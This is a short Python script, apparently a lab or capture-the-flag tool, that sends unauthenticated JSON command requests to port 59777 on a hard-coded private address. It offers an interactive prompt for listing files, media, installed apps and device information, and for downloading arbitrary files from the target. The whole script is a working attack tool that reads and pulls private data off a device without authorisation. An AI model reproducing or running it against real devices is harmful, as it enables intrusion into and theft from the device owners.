import requests as rq

url = 'http://10.10.10.247:59777/'

header = {'Content-Type': 'application/json'}

def menu():
    print("Available commands : ")
    print("  listFiles         : List all Files.")
    print("  listPics          : List all Pictures.")
    print("  listVideos        : List all videos.")
    print("  listAudios        : List all audios.")
    print("  listApps          : List Applications installed.")
    print("  listAppsSystem    : List System apps.")
    print("  listAppsPhone     : List Communication related apps.")
    print("  listAppsSdcard    : List apps on the SDCard.")
    print("  listAppsAll       : List all Application.")
    print("  getFile           : Download a file.")
    print("  getDeviceInfo     : Get device info.")

def get_file(path):
	s = rq.Session()
	res = s.get(url + path, headers=header, verify=False)
	path = path.split('/')[-1]
	with open('./files/'+path, 'wb') as f:
		f.write(res.content)
		print(f'Written to {path}')
		

def run_cmd(cmd):
	if len(cmd) > 1:
		if cmd[0] == 'getFile':
			get_file(cmd[1])
		else: 
			res = rq.post(url+cmd[1], headers=header, data=f'{{command: {cmd[0]}}}')
			print(res.text)
	else:
		res = rq.post(url, headers=header, data=f'{{command: {cmd[0]}}}')
		print(res.text)


while True:
	menu()
	cmd = input('cmd>> ').split()
	run_cmd(cmd)
